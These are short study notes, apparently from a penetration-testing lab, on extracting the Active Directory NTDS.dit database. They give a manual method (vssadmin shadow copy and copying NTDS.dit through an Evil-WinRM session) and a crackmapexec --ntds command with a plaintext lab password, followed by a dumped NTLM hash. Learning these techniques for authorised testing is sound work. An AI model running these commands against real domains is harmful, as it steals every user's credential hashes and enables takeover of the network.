

Manual Method
![[Pasted image 20240912135243.png]]
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
![[Pasted image 20240912135309.png]]
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Automated Crackmapexec
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::